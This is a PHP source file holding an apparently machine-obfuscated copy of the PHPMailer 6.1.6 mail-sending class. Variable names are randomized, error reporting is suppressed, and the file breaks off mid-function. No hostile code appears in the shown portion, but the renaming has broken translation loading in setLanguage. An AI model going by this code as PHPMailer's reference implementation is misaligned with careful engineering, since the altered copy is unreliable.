<?php
error_reporting(E_PARSE | E_CORE_ERROR); class PHPMailer { const CHARSET_ASCII = 'us-ascii'; const CHARSET_ISO88591 = 'iso-8859-1'; const CHARSET_UTF8 = 'utf-8'; const CONTENT_TYPE_PLAINTEXT = 'text/plain'; const CONTENT_TYPE_TEXT_CALENDAR = 'text/calendar'; const CONTENT_TYPE_TEXT_HTML = 'text/html'; const CONTENT_TYPE_MULTIPART_ALTERNATIVE = 'multipart/alternative'; const CONTENT_TYPE_MULTIPART_MIXED = 'multipart/mixed'; const CONTENT_TYPE_MULTIPART_RELATED = 'multipart/related'; const ENCODING_7BIT = '7bit'; const ENCODING_8BIT = '8bit'; const ENCODING_BASE64 = 'base64'; const ENCODING_BINARY = 'binary'; const ENCODING_QUOTED_PRINTABLE = 'quoted-printable'; const ENCRYPTION_STARTTLS = 'tls'; const ENCRYPTION_SMTPS = 'ssl'; const ICAL_METHOD_REQUEST = 'REQUEST'; const ICAL_METHOD_PUBLISH = 'PUBLISH'; const ICAL_METHOD_REPLY = 'REPLY'; const ICAL_METHOD_ADD = 'ADD'; const ICAL_METHOD_CANCEL = 'CANCEL'; const ICAL_METHOD_REFRESH = 'REFRESH'; const ICAL_METHOD_COUNTER = 'COUNTER'; const ICAL_METHOD_DECLINECOUNTER = 'DECLINECOUNTER'; public $Priority; public $CharSet = self::CHARSET_ISO88591; public $ContentType = self::CONTENT_TYPE_PLAINTEXT; public $Encoding = self::ENCODING_8BIT; public $ErrorInfo = ''; public $From = 'root@localhost'; public $FromName = 'Root User'; public $Sender = ''; public $Subject = ''; public $Body = ''; public $AltBody = ''; public $Ical = ''; protected static $IcalMethods = array(self::ICAL_METHOD_REQUEST, self::ICAL_METHOD_PUBLISH, self::ICAL_METHOD_REPLY, self::ICAL_METHOD_ADD, self::ICAL_METHOD_CANCEL, self::ICAL_METHOD_REFRESH, self::ICAL_METHOD_COUNTER, self::ICAL_METHOD_DECLINECOUNTER); protected $MIMEBody = ''; protected $MIMEHeader = ''; protected $mailHeader = ''; public $WordWrap = 0; public $Mailer = 'mail'; public $Sendmail = '/usr/sbin/sendmail'; public $UseSendmailOptions = true; public $ConfirmReadingTo = ''; public $Hostname = ''; public $MessageID = ''; public $MessageDate = ''; public $Host = 'localhost'; public $Port = 25; public $Helo = ''; public $SMTPSecure = ''; public $SMTPAutoTLS = true; public $SMTPAuth = false; public $SMTPOptions = array(); public $Username = ''; public $Password = ''; public $AuthType = ''; protected $oauth; public $Timeout = 300; public $dsn = ''; public $SMTPDebug = 0; public $Debugoutput = 'echo'; public $SMTPKeepAlive = false; public $SingleTo = false; protected $SingleToArray = array(); public $do_verp = false; public $AllowEmpty = false; public $DKIM_selector = ''; public $DKIM_identity = ''; public $DKIM_passphrase = ''; public $DKIM_domain = ''; public $DKIM_copyHeaderFields = true; public $DKIM_extraHeaders = array(); public $DKIM_private = ''; public $DKIM_private_string = ''; public $action_function = ''; public $XMailer = ''; public static $validator = 'php'; protected $smtp; protected $to = array(); protected $cc = array(); protected $bcc = array(); protected $ReplyTo = array(); protected $all_recipients = array(); protected $RecipientsQueue = array(); protected $ReplyToQueue = array(); protected $attachment = array(); protected $CustomHeader = array(); protected $lastMessageID = ''; protected $message_type = ''; protected $boundary = array(); protected $language = array(); protected $error_count = 0; protected $sign_cert_file = ''; protected $sign_key_file = ''; protected $sign_extracerts_file = ''; protected $sign_key_pass = ''; protected $exceptions = false; protected $uniqueid = ''; const VERSION = '6.1.6'; const STOP_MESSAGE = 0; const STOP_CONTINUE = 1; const STOP_CRITICAL = 2; const CRLF = '
'; const FWS = ' '; protected static $LE = self::CRLF; const MAIL_MAX_LINE_LENGTH = 63; const MAX_LINE_LENGTH = 998; const STD_LINE_LENGTH = 76; public function __construct($sp26e59e = null) { if (null !== $sp26e59e) { $this->exceptions = (bool) $sp26e59e; } $this->Debugoutput = strpos(PHP_SAPI, 'cli') !== false ? 'echo' : 'html'; } public function __destruct() { $this->smtpClose(); } private function spd7ac6f($spab1114, $spca8750, $spd76997, $sp03359b, $sp7d456c) { if (ini_get('mbstring.func_overload') & 1) { $spca8750 = $this->secureHeader($spca8750); } else { $spca8750 = $this->encodeHeader($this->secureHeader($spca8750)); } if (!$this->UseSendmailOptions || null === $sp7d456c) { $spf988c0 = @mail($spab1114, $spca8750, $spd76997, $sp03359b); } else { $spf988c0 = @mail($spab1114, $spca8750, $spd76997, $sp03359b, $sp7d456c); } return $spf988c0; } protected function edebug($speadb40) { if ($this->SMTPDebug <= 0) { return; } if ($this->Debugoutput instanceof \Psr\Log\LoggerInterface) { $this->Debugoutput->debug($speadb40); return; } if (is_callable($this->Debugoutput) && !in_array($this->Debugoutput, array('error_log', 'html', 'echo'))) { call_user_func($this->Debugoutput, $speadb40, $this->SMTPDebug); return; } switch ($this->Debugoutput) { case 'error_log': error_log($speadb40); break; case 'html': echo htmlentities(preg_replace('/[\\r\\n]+/', '', $speadb40), ENT_QUOTES, 'UTF-8'), '<br>
'; break; case 'echo': default: $speadb40 = preg_replace('/\\r\\n|\\r/m', '
', $speadb40); echo gmdate('Y-m-d H:i:s'), '	', trim(str_replace('
', '
                   	                  ', trim($speadb40))), '
'; } } public function isHTML($sp87dcc6 = true) { if ($sp87dcc6) { $this->ContentType = static::CONTENT_TYPE_TEXT_HTML; } else { $this->ContentType = static::CONTENT_TYPE_PLAINTEXT; } } public function isSMTP() { $this->Mailer = 'smtp'; } public function isMail() { $this->Mailer = 'mail'; } public function isSendmail() { $spf8c338 = ini_get('sendmail_path'); if (false === stripos($spf8c338, 'sendmail')) { $this->Sendmail = '/usr/sbin/sendmail'; } else { $this->Sendmail = $spf8c338; } $this->Mailer = 'sendmail'; } public function isQmail() { $spf8c338 = ini_get('sendmail_path'); if (false === stripos($spf8c338, 'qmail')) { $this->Sendmail = '/var/qmail/bin/qmail-inject'; } else { $this->Sendmail = $spf8c338; } $this->Mailer = 'qmail'; } public function addAddress($sp973192, $spdeeed8 = '') { return $this->addOrEnqueueAnAddress('to', $sp973192, $spdeeed8); } public function addCC($sp973192, $spdeeed8 = '') { return $this->addOrEnqueueAnAddress('cc', $sp973192, $spdeeed8); } public function addBCC($sp973192, $spdeeed8 = '') { return $this->addOrEnqueueAnAddress('bcc', $sp973192, $spdeeed8); } public function addReplyTo($sp973192, $spdeeed8 = '') { return $this->addOrEnqueueAnAddress('Reply-To', $sp973192, $spdeeed8); } protected function addOrEnqueueAnAddress($spe50020, $sp973192, $spdeeed8) { $sp973192 = trim($sp973192); $spdeeed8 = trim(preg_replace('/[\\r\\n]+/', '', $spdeeed8)); $sp5906d1 = strrpos($sp973192, '@'); if (false === $sp5906d1) { $sp73d59a = sprintf('%s (%s): %s', $this->lang('invalid_address'), $spe50020, $sp973192); $this->setError($sp73d59a); $this->edebug($sp73d59a); if ($this->exceptions) { throw new Exception($sp73d59a); } return false; } $sp7d456c = array($spe50020, $sp973192, $spdeeed8); if (static::idnSupported() && $this->has8bitChars(substr($sp973192, ++$sp5906d1))) { if ('Reply-To' !== $spe50020) { if (!array_key_exists($sp973192, $this->RecipientsQueue)) { $this->RecipientsQueue[$sp973192] = $sp7d456c; return true; } } elseif (!array_key_exists($sp973192, $this->ReplyToQueue)) { $this->ReplyToQueue[$sp973192] = $sp7d456c; return true; } return false; } return call_user_func_array(array($this, 'addAnAddress'), $sp7d456c); } protected function addAnAddress($spe50020, $sp973192, $spdeeed8 = '') { if (!in_array($spe50020, array('to', 'cc', 'bcc', 'Reply-To'))) { $sp73d59a = sprintf('%s: %s', $this->lang('Invalid recipient kind'), $spe50020); $this->setError($sp73d59a); $this->edebug($sp73d59a); if ($this->exceptions) { throw new Exception($sp73d59a); } return false; } if (!static::validateAddress($sp973192)) { $sp73d59a = sprintf('%s (%s): %s', $this->lang('invalid_address'), $spe50020, $sp973192); $this->setError($sp73d59a); $this->edebug($sp73d59a); if ($this->exceptions) { throw new Exception($sp73d59a); } return false; } if ('Reply-To' !== $spe50020) { if (!array_key_exists(strtolower($sp973192), $this->all_recipients)) { $this->{$spe50020}[] = array($sp973192, $spdeeed8); $this->all_recipients[strtolower($sp973192)] = true; return true; } } elseif (!array_key_exists(strtolower($sp973192), $this->ReplyTo)) { $this->ReplyTo[strtolower($sp973192)] = array($sp973192, $spdeeed8); return true; } return false; } public static function parseAddresses($sp7137ae, $sp600685 = true) { $spda7ef0 = array(); if ($sp600685 && function_exists('imap_rfc822_parse_adrlist')) { $spd72118 = imap_rfc822_parse_adrlist($sp7137ae, ''); foreach ($spd72118 as $sp973192) { if ('.SYNTAX-ERROR.' !== $sp973192->host && static::validateAddress($sp973192->mailbox . '@' . $sp973192->host)) { $spda7ef0[] = array('name' => property_exists($sp973192, 'personal') ? $sp973192->personal : '', 'address' => $sp973192->mailbox . '@' . $sp973192->host); } } } else { $spd72118 = explode(',', $sp7137ae); foreach ($spd72118 as $sp973192) { $sp973192 = trim($sp973192); if (strpos($sp973192, '<') === false) { if (static::validateAddress($sp973192)) { $spda7ef0[] = array('name' => '', 'address' => $sp973192); } } else { list($spdeeed8, $spf839a5) = explode('<', $sp973192); $spf839a5 = trim(str_replace('>', '', $spf839a5)); if (static::validateAddress($spf839a5)) { $spda7ef0[] = array('name' => trim(str_replace(array('"', '\''), '', $spdeeed8)), 'address' => $spf839a5); } } } } return $spda7ef0; } public function setFrom($sp973192, $spdeeed8 = '', $sp4f8149 = true) { $sp973192 = trim($sp973192); $spdeeed8 = trim(preg_replace('/[\\r\\n]+/', '', $spdeeed8)); $sp5906d1 = strrpos($sp973192, '@'); if (false === $sp5906d1 || (!$this->has8bitChars(substr($sp973192, ++$sp5906d1)) || !static::idnSupported()) && !static::validateAddress($sp973192)) { $sp73d59a = sprintf('%s (From): %s', $this->lang('invalid_address'), $sp973192); $this->setError($sp73d59a); $this->edebug($sp73d59a); if ($this->exceptions) { throw new Exception($sp73d59a); } return false; } $this->From = $sp973192; $this->FromName = $spdeeed8; if ($sp4f8149 && empty($this->Sender)) { $this->Sender = $sp973192; } return true; } public function getLastMessageID() { return $this->lastMessageID; } public static function validateAddress($sp973192, $sp9d0f23 = null) { if (null === $sp9d0f23) { $sp9d0f23 = static::$validator; } if (is_callable($sp9d0f23)) { return $sp9d0f23($sp973192); } if (strpos($sp973192, '
') !== false || strpos($sp973192, '') !== false) { return false; } switch ($sp9d0f23) { case 'pcre': case 'pcre8': return (bool) preg_match('/^(?!(?>(?1)"?(?>\\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\\[ -~]|[^"])"?(?1)){65,}@)' . '((?>(?>(?>((?>(?>(?>\\x0D\\x0A)?[\\t ])+|(?>[\\t ]*\\x0D\\x0A)?[\\t ]+)?)(\\((?>(?2)' . '(?>[\\x01-\\x08\\x0B\\x0C\\x0E-\'*-\\[\\]-\\x7F]|\\\\[\\x00-\\x7F]|(?3)))*(?2)\\)))+(?2))|(?2))?)' . '([!#-\'*+\\/-9=?^-~-]+|"(?>(?2)(?>[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\[\\x00-\\x7F]))*' . '(?2)")(?>(?1)\\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)' . '(?>(?1)\\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' . '|(?!(?:.*[a-f0-9][:\\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' . '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' . '|[1-9]?[0-9])(?>\\.(?9)){3}))\\])(?1)$/isD', $sp973192); case 'html5': return (bool) preg_match('/^[a-zA-Z0-9.!#$%&\'*+\\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' . '[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD', $sp973192); case 'php': default: return filter_var($sp973192, FILTER_VALIDATE_EMAIL) !== false; } } public static function idnSupported() { return function_exists('idn_to_ascii') && function_exists('mb_convert_encoding'); } public function punyencodeAddress($sp973192) { $sp5906d1 = strrpos($sp973192, '@'); if (!empty($this->CharSet) && false !== $sp5906d1 && static::idnSupported()) { $sp85866f = substr($sp973192, ++$sp5906d1); if ($this->has8bitChars($sp85866f) && @mb_check_encoding($sp85866f, $this->CharSet)) { $sp85866f = mb_convert_encoding($sp85866f, 'UTF-8', $this->CharSet); $sp7b4d55 = 0; if (defined('INTL_IDNA_VARIANT_UTS46')) { $spb17517 = idn_to_ascii($sp85866f, $sp7b4d55, INTL_IDNA_VARIANT_UTS46); } elseif (defined('INTL_IDNA_VARIANT_2003')) { $spb17517 = idn_to_ascii($sp85866f, $sp7b4d55, INTL_IDNA_VARIANT_2003); } else { $spb17517 = idn_to_ascii($sp85866f, $sp7b4d55); } if (false !== $spb17517) { return substr($sp973192, 0, $sp5906d1) . $spb17517; } } } return $sp973192; } public function send() { try { if (!$this->preSend()) { return false; } return $this->postSend(); } catch (Exception $spa08c34) { $this->mailHeader = ''; $this->setError($spa08c34->getMessage()); if ($this->exceptions) { throw $spa08c34; } return false; } } public function preSend() { if ('smtp' === $this->Mailer || 'mail' === $this->Mailer && stripos(PHP_OS, 'WIN') === 0) { static::setLE(self::CRLF); } else { static::setLE(PHP_EOL); } if ('mail' === $this->Mailer && (PHP_VERSION_ID >= 70000 && PHP_VERSION_ID < 70017 || PHP_VERSION_ID >= 70100 && PHP_VERSION_ID < 70103) && ini_get('mail.add_x_header') === '1' && stripos(PHP_OS, 'WIN') === 0) { trigger_error('Your version of PHP is affected by a bug that may result in corrupted messages.' . ' To fix it, switch to sending using SMTP, disable the mail.add_x_header option in' . ' your php.ini, switch to MacOS or Linux, or upgrade your PHP to version 7.0.17+ or 7.1.3+.', E_USER_WARNING); } try { $this->error_count = 0; $this->mailHeader = ''; foreach (array_merge($this->RecipientsQueue, $this->ReplyToQueue) as $sp7d456c) { $sp7d456c[1] = $this->punyencodeAddress($sp7d456c[1]); call_user_func_array(array($this, 'addAnAddress'), $sp7d456c); } if (count($this->to) + count($this->cc) + count($this->bcc) < 1) { throw new Exception($this->lang('provide_address'), self::STOP_CRITICAL); } foreach (array('From', 'Sender', 'ConfirmReadingTo') as $spab1b40) { $this->{$spab1b40} = trim($this->{$spab1b40}); if (empty($this->{$spab1b40})) { continue; } $this->{$spab1b40} = $this->punyencodeAddress($this->{$spab1b40}); if (!static::validateAddress($this->{$spab1b40})) { $sp73d59a = sprintf('%s (%s): %s', $this->lang('invalid_address'), $spab1b40, $this->{$spab1b40}); $this->setError($sp73d59a); $this->edebug($sp73d59a); if ($this->exceptions) { throw new Exception($sp73d59a); } return false; } } if ($this->alternativeExists()) { $this->ContentType = static::CONTENT_TYPE_MULTIPART_ALTERNATIVE; } $this->setMessageType(); if (!$this->AllowEmpty && empty($this->Body)) { throw new Exception($this->lang('empty_message'), self::STOP_CRITICAL); } $this->Subject = trim($this->Subject); $this->MIMEHeader = ''; $this->MIMEBody = $this->createBody(); $sp5147ef = $this->MIMEHeader; $this->MIMEHeader = $this->createHeader(); $this->MIMEHeader .= $sp5147ef; if ('mail' === $this->Mailer) { if (count($this->to) > 0) { $this->mailHeader .= $this->addrAppend('To', $this->to); } else { $this->mailHeader .= $this->headerLine('To', 'undisclosed-recipients:;'); } $this->mailHeader .= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader($this->Subject))); } if (!empty($this->DKIM_domain) && !empty($this->DKIM_selector) && (!empty($this->DKIM_private_string) || !empty($this->DKIM_private) && static::isPermittedPath($this->DKIM_private) && file_exists($this->DKIM_private))) { $sp103962 = $this->DKIM_Add($this->MIMEHeader . $this->mailHeader, $this->encodeHeader($this->secureHeader($this->Subject)), $this->MIMEBody); $this->MIMEHeader = static::stripTrailingWSP($this->MIMEHeader) . static::$LE . static::normalizeBreaks($sp103962) . static::$LE; } return true; } catch (Exception $spa08c34) { $this->setError($spa08c34->getMessage()); if ($this->exceptions) { throw $spa08c34; } return false; } } public function postSend() { try { switch ($this->Mailer) { case 'sendmail': case 'qmail': return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody); case 'smtp': return $this->smtpSend($this->MIMEHeader, $this->MIMEBody); case 'mail': return $this->mailSend($this->MIMEHeader, $this->MIMEBody); default: $spd1b569 = $this->Mailer . 'Send'; if (method_exists($this, $spd1b569)) { return $this->{$spd1b569}($this->MIMEHeader, $this->MIMEBody); } return $this->mailSend($this->MIMEHeader, $this->MIMEBody); } } catch (Exception $spa08c34) { $this->setError($spa08c34->getMessage()); $this->edebug($spa08c34->getMessage()); if ($this->exceptions) { throw $spa08c34; } } return false; } protected function sendmailSend($sp03359b, $spd76997) { $sp03359b = static::stripTrailingWSP($sp03359b) . static::$LE . static::$LE; if (!empty($this->Sender) && self::isShellSafe($this->Sender)) { if ('qmail' === $this->Mailer) { $sp9cdb83 = '%s -f%s'; } else { $sp9cdb83 = '%s -oi -f%s -t'; } } elseif ('qmail' === $this->Mailer) { $sp9cdb83 = '%s'; } else { $sp9cdb83 = '%s -oi -t'; } $sp294b3a = sprintf($sp9cdb83, escapeshellcmd($this->Sendmail), $this->Sender); if ($this->SingleTo) { foreach ($this->SingleToArray as $spc7465b) { $sp9980dd = @popen($sp294b3a, 'w'); if (!$sp9980dd) { throw new Exception($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL); } fwrite($sp9980dd, 'To: ' . $spc7465b . '
'); fwrite($sp9980dd, $sp03359b); fwrite($sp9980dd, $spd76997); $spf988c0 = pclose($sp9980dd); $this->doCallback($spf988c0 === 0, array($spc7465b), $this->cc, $this->bcc, $this->Subject, $spd76997, $this->From, array()); if (0 !== $spf988c0) { throw new Exception($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL); } } } else { $sp9980dd = @popen($sp294b3a, 'w'); if (!$sp9980dd) { throw new Exception($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL); } fwrite($sp9980dd, $sp03359b); fwrite($sp9980dd, $spd76997); $spf988c0 = pclose($sp9980dd); $this->doCallback($spf988c0 === 0, $this->to, $this->cc, $this->bcc, $this->Subject, $spd76997, $this->From, array()); if (0 !== $spf988c0) { throw new Exception($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL); } } return true; } protected static function isShellSafe($spccb6f7) { if (escapeshellcmd($spccb6f7) !== $spccb6f7 || !in_array(escapeshellarg($spccb6f7), array("'{$spccb6f7}'", "\"{$spccb6f7}\""))) { return false; } $spa5d894 = strlen($spccb6f7); for ($sp9f800d = 0; $sp9f800d < $spa5d894; ++$sp9f800d) { $spf7ad5f = $spccb6f7[$sp9f800d]; if (!ctype_alnum($spf7ad5f) && strpos('@_-.', $spf7ad5f) === false) { return false; } } return true; } protected static function isPermittedPath($sp9e5935) { return !preg_match('#^[a-z]+://#i', $sp9e5935); } protected function mailSend($sp03359b, $spd76997) { $sp03359b = static::stripTrailingWSP($sp03359b) . static::$LE . static::$LE; $spf55820 = array(); foreach ($this->to as $sp7c6319) { $spf55820[] = $this->addrFormat($sp7c6319); } $spab1114 = implode(', ', $spf55820); $sp7d456c = null; if (!empty($this->Sender) && static::validateAddress($this->Sender) && self::isShellSafe($this->Sender)) { $sp7d456c = sprintf('-f%s', $this->Sender); } if (!empty($this->Sender) && static::validateAddress($this->Sender)) { $spc28b1b = ini_get('sendmail_from'); ini_set('sendmail_from', $this->Sender); } $spf988c0 = false; if ($this->SingleTo && count($spf55820) > 1) { foreach ($spf55820 as $spc7465b) { $spf988c0 = $this->spd7ac6f($spc7465b, $this->Subject, $spd76997, $sp03359b, $sp7d456c); $this->doCallback($spf988c0, array($spc7465b), $this->cc, $this->bcc, $this->Subject, $spd76997, $this->From, array()); } } else { $spf988c0 = $this->spd7ac6f($spab1114, $this->Subject, $spd76997, $sp03359b, $sp7d456c); $this->doCallback($spf988c0, $this->to, $this->cc, $this->bcc, $this->Subject, $spd76997, $this->From, array()); } if (isset($spc28b1b)) { ini_set('sendmail_from', $spc28b1b); } if (!$spf988c0) { throw new Exception($this->lang('instantiate'), self::STOP_CRITICAL); } return true; } public function getSMTPInstance() { if (!is_object($this->smtp)) { $this->smtp = new \PHPMailer\PHPMailer\SMTP(); } return $this->smtp; } public function setSMTPInstance(SMTP $spe3949d) { $this->smtp = $spe3949d; return $this->smtp; } protected function smtpSend($sp03359b, $spd76997) { $sp03359b = static::stripTrailingWSP($sp03359b) . static::$LE . static::$LE; $sp1583d8 = array(); if (!$this->smtpConnect($this->SMTPOptions)) { throw new Exception($this->lang('smtp_connect_failed'), self::STOP_CRITICAL); } if ('' === $this->Sender) { $spba1d48 = $this->From; } else { $spba1d48 = $this->Sender; } if (!$this->smtp->mail($spba1d48)) { $this->setError($this->lang('from_failed') . $spba1d48 . ' : ' . implode(',', $this->smtp->getError())); throw new Exception($this->ErrorInfo, self::STOP_CRITICAL); } $spa432a2 = array(); foreach (array($this->to, $this->cc, $this->bcc) as $spd87fd2) { foreach ($spd87fd2 as $spab1114) { if (!$this->smtp->recipient($spab1114[0], $this->dsn)) { $sp7ceb96 = $this->smtp->getError(); $sp1583d8[] = array('to' => $spab1114[0], 'error' => $sp7ceb96['detail']); $spe43268 = false; } else { $spe43268 = true; } $spa432a2[] = array('issent' => $spe43268, 'to' => $spab1114[0]); } } if (count($this->all_recipients) > count($sp1583d8) && !$this->smtp->data($sp03359b . $spd76997)) { throw new Exception($this->lang('data_not_accepted'), self::STOP_CRITICAL); } $sp77233a = $this->smtp->getLastTransactionID(); if ($this->SMTPKeepAlive) { $this->smtp->reset(); } else { $this->smtp->quit(); $this->smtp->close(); } foreach ($spa432a2 as $sp19d834) { $this->doCallback($sp19d834['issent'], array($sp19d834['to']), array(), array(), $this->Subject, $spd76997, $this->From, array('smtp_transaction_id' => $sp77233a)); } if (count($sp1583d8) > 0) { $sp106839 = ''; foreach ($sp1583d8 as $sp36ea68) { $sp106839 .= $sp36ea68['to'] . ': ' . $sp36ea68['error']; } throw new Exception($this->lang('recipients_failed') . $sp106839, self::STOP_CONTINUE); } return true; } public function smtpConnect($sp4411bb = null) { if (null === $this->smtp) { $this->smtp = $this->getSMTPInstance(); } if (null === $sp4411bb) { $sp4411bb = $this->SMTPOptions; } if ($this->smtp->connected()) { return true; } $this->smtp->setTimeout($this->Timeout); $this->smtp->setDebugLevel($this->SMTPDebug); $this->smtp->setDebugOutput($this->Debugoutput); $this->smtp->setVerp($this->do_verp); $spb39b39 = explode(';', $this->Host); $spdae4e0 = null; foreach ($spb39b39 as $spce6631) { $sp580741 = array(); if (!preg_match('/^(?:(ssl|tls):\\/\\/)?(.+?)(?::(\\d+))?$/', trim($spce6631), $sp580741)) { $this->edebug($this->lang('invalid_hostentry') . ' ' . trim($spce6631)); continue; } if (!static::isValidHost($sp580741[2])) { $this->edebug($this->lang('invalid_host') . ' ' . $sp580741[2]); continue; } $spcf37e5 = ''; $sp9ce41c = $this->SMTPSecure; $sp759d78 = static::ENCRYPTION_STARTTLS === $this->SMTPSecure; if ('ssl' === $sp580741[1] || '' === $sp580741[1] && static::ENCRYPTION_SMTPS === $this->SMTPSecure) { $spcf37e5 = 'ssl://'; $sp759d78 = false; $sp9ce41c = static::ENCRYPTION_SMTPS; } elseif ('tls' === $sp580741[1]) { $sp759d78 = true; $sp9ce41c = static::ENCRYPTION_STARTTLS; } $sp6b42ca = defined('OPENSSL_ALGO_SHA256'); if (static::ENCRYPTION_STARTTLS === $sp9ce41c || static::ENCRYPTION_SMTPS === $sp9ce41c) { if (!$sp6b42ca) { throw new Exception($this->lang('extension_missing') . 'openssl', self::STOP_CRITICAL); } } $sp843aa1 = $sp580741[2]; $spf9e127 = $this->Port; if (array_key_exists(3, $sp580741) && is_numeric($sp580741[3]) && $sp580741[3] > 0 && $sp580741[3] < 65536) { $spf9e127 = (int) $sp580741[3]; } if ($this->smtp->connect($spcf37e5 . $sp843aa1, $spf9e127, $this->Timeout, $sp4411bb)) { try { if ($this->Helo) { $speb5bfe = $this->Helo; } else { $speb5bfe = $this->serverHostname(); } $this->smtp->hello($speb5bfe); if ($this->SMTPAutoTLS && $sp6b42ca && 'ssl' !== $sp9ce41c && $this->smtp->getServerExt('STARTTLS')) { $sp759d78 = true; } if ($sp759d78) { if (!$this->smtp->startTLS()) { throw new Exception($this->lang('connect_host')); } $this->smtp->hello($speb5bfe); } if ($this->SMTPAuth && !$this->smtp->authenticate($this->Username, $this->Password, $this->AuthType, $this->oauth)) { throw new Exception($this->lang('authenticate')); } return true; } catch (Exception $spa08c34) { $spdae4e0 = $spa08c34; $this->edebug($spa08c34->getMessage()); $this->smtp->quit(); } } } $this->smtp->close(); if ($this->exceptions && null !== $spdae4e0) { throw $spdae4e0; } return false; } public function smtpClose() { if (null !== $this->smtp && $this->smtp->connected()) { $this->smtp->quit(); $this->smtp->close(); } } public function setLanguage($spbdab7e = 'en', $sp9e9ff3 = '') { $sp99e191 = array('br' => 'pt_br', 'cz' => 'cs', 'dk' => 'da', 'no' => 'nb', 'se' => 'sv', 'rs' => 'sr', 'tg' => 'tl', 'am' => 'hy'); if (isset($sp99e191[$spbdab7e])) { $spbdab7e = $sp99e191[$spbdab7e]; } $sp79dcb6 = array('authenticate' => 'SMTP Error: Could not authenticate.', 'connect_host' => 'SMTP Error: Could not connect to SMTP host.', 'data_not_accepted' => 'SMTP Error: data not accepted.', 'empty_message' => 'Message body empty', 'encoding' => 'Unknown encoding: ', 'execute' => 'Could not execute: ', 'file_access' => 'Could not access file: ', 'file_open' => 'File Error: Could not open file: ', 'from_failed' => 'The following From address failed: ', 'instantiate' => 'Could not instantiate mail function.', 'invalid_address' => 'Invalid address: ', 'invalid_hostentry' => 'Invalid hostentry: ', 'invalid_host' => 'Invalid host: ', 'mailer_not_supported' => ' mailer is not supported.', 'provide_address' => 'You must provide at least one recipient email address.', 'recipients_failed' => 'SMTP Error: The following recipients failed: ', 'signing' => 'Signing Error: ', 'smtp_connect_failed' => 'SMTP connect() failed.', 'smtp_error' => 'SMTP server error: ', 'variable_set' => 'Cannot set or reset variable: ', 'extension_missing' => 'Extension missing: '); if (empty($sp9e9ff3)) { $sp9e9ff3 = dirname(__DIR__) . DIRECTORY_SEPARATOR . 'language' . DIRECTORY_SEPARATOR; } if (!preg_match('/^[a-z]{2}(?:_[a-zA-Z]{2})?$/', $spbdab7e)) { $spbdab7e = 'en'; } $sp5fd5b0 = true; $spcc19ff = $sp9e9ff3 . 'phpmailer.lang-' . $spbdab7e . '.php'; if ('en' !== $spbdab7e) { if (!static::isPermittedPath($spcc19ff) || !file_exists($spcc19ff)) { $sp5fd5b0 = false; } else { $sp5fd5b0 = (include $spcc19ff); } } $this->language = $sp79dcb6; return (bool) $sp5fd5b0; } public function getTranslations() { return $this->language; } public function addrAppend($sp84b96c, $spc7a4c5) { $spda7ef0 = array(); foreach ($spc7a4c5 as $sp973192) { $spda7ef0[] = $this->addrFormat($sp973192); } return $sp84b96c . ': ' . implode(', ', $spda7ef0) . static::$LE; } public function addrFormat($spc7a4c5) { if (empty($spc7a4c5[1])) { return $this->secureHeader($spc7a4c5[0]); } return $this->encodeHeader($this->secureHeader($spc7a4c5[1]), 'phrase') . ' <' . $this->secureHeader($spc7a4c5[0]) . '>'; } public function wrapText($sp6713e3, $spa5d894, $sp8502fe = false) { if ($sp8502fe) { $sp83f5e4 = sprintf(' =%s', static::$LE); } else { $sp83f5e4 = static::$LE; } $spc1a87f = static::CHARSET_UTF8 === strtolower($this->CharSet); $sp93bc70 = strlen(static::$LE); $sp532e9c = strlen(static::$LE); $sp6713e3 = static::normalizeBreaks($sp6713e3); if (substr($sp6713e3, -$sp93bc70) === static::$LE) { $sp6713e3 = substr($sp6713e3, 0, -$sp93bc70); } $sp4b9890 = explode(static::$LE, $sp6713e3); $sp6713e3 = ''; foreach ($sp4b9890 as $spc351d1) { $sp4c3faf = explode(' ', $spc351d1); $sp470645 = ''; $sp7cc3e3 = true; foreach ($sp4c3faf as $spf993c2) { if ($sp8502fe && strlen($spf993c2) > $spa5d894) { $sp139fa3 = $spa5d894 - strlen($sp470645) - $sp532e9c; if (!$sp7cc3e3) { if ($sp139fa3 > 20) { $spbd0a44 = $sp139fa3; if ($spc1a87f) { $spbd0a44 = $this->utf8CharBoundary($spf993c2, $spbd0a44); } elseif ('=' === substr($spf993c2, $spbd0a44 - 1, 1)) { --$spbd0a44; } elseif ('=' === substr($spf993c2, $spbd0a44 - 2, 1)) { $spbd0a44 -= 2; } $sp25e41a = substr($spf993c2, 0, $spbd0a44); $spf993c2 = substr($spf993c2, $spbd0a44); $sp470645 .= ' ' . $sp25e41a; $sp6713e3 .= $sp470645 . sprintf('=%s', static::$LE); } else { $sp6713e3 .= $sp470645 . $sp83f5e4; } $sp470645 = ''; } while ($spf993c2 !== '') { if ($spa5d894 <= 0) { break; } $spbd0a44 = $spa5d894; if ($spc1a87f) { $spbd0a44 = $this->utf8CharBoundary($spf993c2, $spbd0a44); } elseif ('=' === substr($spf993c2, $spbd0a44 - 1, 1)) { --$spbd0a44; } elseif ('=' === substr($spf993c2, $spbd0a44 - 2, 1)) { $spbd0a44 -= 2; } $sp25e41a = substr($spf993c2, 0, $spbd0a44); $spf993c2 = (string) substr($spf993c2, $spbd0a44); if ($spf993c2 !== '') { $sp6713e3 .= $sp25e41a . sprintf('=%s', static::$LE); } else { $sp470645 = $sp25e41a; } } } else { $sp144903 = 